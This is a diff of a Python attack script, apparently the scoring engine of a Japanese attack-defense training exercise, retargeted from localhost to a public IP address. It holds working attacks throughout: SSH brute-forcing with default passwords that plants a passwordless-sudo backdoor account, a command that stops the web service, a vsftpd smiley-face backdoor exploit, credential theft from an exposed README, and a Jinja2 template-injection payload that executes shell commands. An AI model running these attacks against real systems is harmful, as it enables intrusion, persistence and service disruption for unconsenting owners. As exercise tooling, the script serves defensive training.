@@ -14,16 +14,19 @@ import m1_brute
 # スコアボードのアドレス
 scoreboard = "localhost:5000"
 # 攻撃対象のアドレス
-target = "127.0.0.1"
+hosts = {
+	1: "8.209.241.84",
+	2: "8.209.241.84"
+}
 
 
 # port = 10000 + 1000 * team_id + ports["ssh"]
 ports = {
 	"ftp": 21,
 	"ssh": 22,
-	"http1": 80,
-	"http2": 81,
-	"vsftpd": 62,
+	"http1": 81,
+	"http2": 80,
+	"vsftpd": 6200,
 }
 
 def sleep_until(t):
@@ -33,7 +36,8 @@ def sleep_until(t):
 
 def chk_alive(team):
 	team = int(team)
-	port = 10000 + 1000 * team + ports["http1"]
+	port = ports["http1"]
+	target = hosts[team_id]
 	q = "http://" + target + ":" + str(port)
 	try:
 		r = requests.get(q, timeout=2)
@@ -56,9 +60,10 @@ def add_score(team, points):
 
 def brute_force(team_id):
 	cmd = 'useradd sg && echo "sg:sg" | chpasswd && usermod -aG sudo sg'
-	exploit = "echo root | su - root -c \"pkill -f 'python3 /var/www/html/webapp/app.py'\""
+	exploit = "echo root | su - root -c \"systemctl stop http-flask.service\""
 	res = []
-	port = 10000 + 1000 * team_id + ports["ssh"]
+	port = ports["ssh"]
+	target = hosts[team_id]
 	res.append(m1_brute.sshc(team_id, target, port, "root", "root", cmd))
 	res.append(m1_brute.sshc(team_id, target, port, "user11", "pass", cmd))
 	res.append(m1_brute.sshc(team_id, target, port, "user1", "user1", cmd))
@@ -72,9 +77,10 @@ def brute_force(team_id):
 	if chk_alive(team_id):
 		add_score(team_id, 50) # WEBサーバーを停止されなかった
 
-def run(team_id, host):
-	portFTP = 10000 + 1000 * team_id + ports["ftp"]
-	lp = 10000 + 1000 * team_id + ports["vsftpd"]
+def run(team_id):
+	portFTP = ports["ftp"]
+	lp = ports["vsftpd"]
+	host = hosts[team_id]
 	user = "USER ayato:)"
 	password = "PASS pass"
 	time.sleep(2)
@@ -97,14 +103,15 @@ def run(team_id, host):
 	except:
 		pass
 	# test ユーザーが作成されているか確認
-	if m1_brute.sshc(team_id, target, 10000 + 1000 * team_id + ports["ssh"], "test", "test", "") != False:
+	if m1_brute.sshc(team_id, host, ports["ssh"], "test", "test", "") != False:
 		print("\033[31mteam",team_id, host + ":" + str(lp), "vsftpd was hacked: created `test` user\033[0m")
 	else:
 		print("team", team_id, host + ":" + str(lp), "vsftpd was not hacked")
 		add_score(team_id, 100) # vsftpdの脆弱性を利用した攻撃を防いだ
 
 def cred_attack(team_id):
-	port = 10000 + 1000 * team_id + ports["http2"]
+	port = ports["http2"]
+	target = hosts[team_id]
 	u = "http://" + target + ":" + str(port) + "/README.md"
 	try:
 		res = requests.get(u, timeout=(6, 7))
@@ -123,7 +130,8 @@ def cred_attack(team_id):
 		print("team", team_id, target + ":" + str(port), "could not get credentials")
 
 def web_attack(team_id):
-	port = str(10000 + 1000 * team_id + ports["http1"])
+	port = str(ports["http1"])
+	target = hosts[team_id]
 	url = "http://" + target + ":" + port
 	uri = '/app?name={{request.application.__globals__.__builtins__.__import__("os").popen("whoami").read()}}'
 	q = (url + uri)
@@ -152,26 +160,30 @@ def web_attack(team_id):
 
 if __name__ == "__main__":
 	#ブルートフォース攻撃のテスト
-	sleep_until(60 * 10)
+	#sleep_until(60 * 5)
+	sleep_until(10)
 	print("====================================")
-	for i in range(1, 9):
+	for i in range(1, 2):
 		threading.Thread(target=brute_force, args=(i,)).start()
 	
 	# vsftpdの脆弱性を利用した攻撃
-	sleep_until(60 * 10)
+	#sleep_until(60 * 3)
+	sleep_until(10)
 	print("====================================")
-	for i in range(1, 9):
-		threading.Thread(target=run, args=(i, target)).start()
+	for i in range(1, 2):
+		threading.Thread(target=run, args=(i,)).start()
 	
 	# クレデンシャル情報の流出
-	sleep_until(60 * 5)
+	#sleep_until(60 * 2)
+	sleep_until(10)
 	print("====================================")
-	for i in range(1, 9):
+	for i in range(1, 2):
 		threading.Thread(target=cred_attack, args=(i,)).start()
 
 	# WEBアプリへの攻撃
-	sleep_until(60 * 5)
+	#sleep_until(60 * 5)
+	sleep_until(10)
 	print("====================================")
-	for i in range(1, 9):
+	for i in range(1, 2):
 		threading.Thread(target=web_attack, args=(i,)).start()
 	
